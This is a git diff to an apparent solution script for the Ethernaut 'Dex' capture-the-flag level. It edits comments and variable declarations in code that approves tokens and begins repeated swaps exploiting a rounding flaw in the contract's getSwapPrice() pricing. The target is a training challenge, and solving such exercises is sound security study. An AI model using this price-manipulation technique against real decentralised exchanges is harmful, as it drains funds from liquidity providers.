@@ -3,16 +3,17 @@
     Well, here's the full explanation of code -> https://dev.to/nvn/ethernaut-hacks-level-22-dex-1e18
 
     Summary (If you feel yourself well verse and is close to the answer):
-    - It's nothing just taking the benefit of swap `getSwapPrice()` function, if you notice the calculation is a bit risky cuz DEX's always use floating point numbers or some external oracles in order to calculate token prices which kind of give them some accurate prices..but here's that is the flaw
+    - It's nothing just taking the benefit of swap `getSwapPrice()` function, if you notice the calculation is a bit risky cuz DEX's always use floating point numbers or some external oracles in order to calculate token prices which kind of give them some accurate prices..but here that's the flaw
 */ 
 
 // Just follow this code
 
+// Providing enough tokens to the contract
 await contract.approve(contract.address, 500)
 
 // assigning token addresses to variables
-t1 = await contract.token1()
-t2 = await contract.token2()
+const t1 = await contract.token1()
+const t2 = await contract.token2()
 
 // here are the swaps
 await contract.swap(t1, t2, 10)
